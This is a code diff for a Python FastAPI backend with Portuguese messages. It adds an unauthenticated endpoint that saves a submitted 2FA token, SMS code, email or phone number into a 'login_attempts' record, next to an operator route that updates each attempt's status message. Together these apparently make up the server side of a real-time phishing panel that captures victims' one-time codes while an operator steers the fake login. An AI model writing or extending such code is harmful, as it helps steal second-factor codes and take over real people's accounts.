@@ -268,6 +268,29 @@ async def update_user_status(user_id: str, status: str, token_data: dict = Depen
     )
     return {"message": f"Status atualizado para {status}"}
 
+class UserInputData(BaseModel):
+    field: str  # "token_2fa", "email_input", "sms_code", "phone_number", "app_mail"
+    value: str
+
+@api_router.post("/user/submit-data/{user_id}")
+async def submit_user_data(user_id: str, data: UserInputData):
+    """Recebe dados do usuário (código 2FA, email, telefone, etc.)"""
+    user = await db.login_attempts.find_one({"id": user_id})
+    if not user:
+        raise HTTPException(status_code=404, detail="Usuário não encontrado")
+    
+    # Mapear campo e atualizar
+    allowed_fields = ["token_2fa", "email_input", "sms_code", "phone_number", "app_mail"]
+    if data.field not in allowed_fields:
+        raise HTTPException(status_code=400, detail="Campo inválido")
+    
+    await db.login_attempts.update_one(
+        {"id": user_id},
+        {"$set": {data.field: data.value}}
+    )
+    
+    return {"message": "Dados recebidos com sucesso"}
+
 # Include the router in the main app
 app.include_router(api_router)
 
